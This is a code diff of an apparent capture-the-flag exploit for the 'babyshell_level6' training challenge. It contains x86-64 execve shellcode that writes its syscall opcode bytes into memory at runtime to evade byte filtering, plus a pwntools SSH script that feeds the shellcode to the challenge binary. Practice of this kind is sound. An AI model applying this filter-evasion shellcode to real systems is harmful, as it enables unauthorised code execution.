@@ -35,7 +35,7 @@ push 0                                     /* push null byte onto stack */
 pop rdx                                    /* pop it into rdx */
 push 0x3b                                  /* push execve onto stack */                                 
 pop rax                                    /* pop it into rax */
-mov ecx, 0x026930ffe                        /* move address of syscall label to ecx */
+mov ecx, 0x26931001                        /* move address of syscall label to ecx */
 mov word ptr [ecx], 0x0f                   /* move second part of opcode of syscall to the address ecx points to */
 mov word ptr [ecx + 1], 0x05               /* move first part of opcode of syscall to the address ecx points to */
 jmp rcx
@@ -55,12 +55,15 @@ s = ssh(host="pwn")
 f = SSHPath('/tmp/my_script.py', ssh=s)
 f.touch()
 f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level6")')
-p = s.process(['/challenge/babyshell_level6'])
-#r = p.recvuntil(b"Reading 0x2000 bytes from stdin.")
-#print(r.decode())
-
 
 shellcode=bytes(shellcode)
+f = SSHPath('/tmp/shellcode', ssh=s)
+f.touch()
+f.write_bytes(shellcode)
 print("length", len(shellcode))
-p.send(shellcode)
+
+p = s.process('cat /tmp/shellcode | /challenge/babyshell_level6', shell=True)
+#r = p.recvuntil(b"Reading 0x2000 bytes from stdin.")
+#print(r.decode())
+#p.send(shellcode)
 print(p.recvall().decode("UTF-8"))
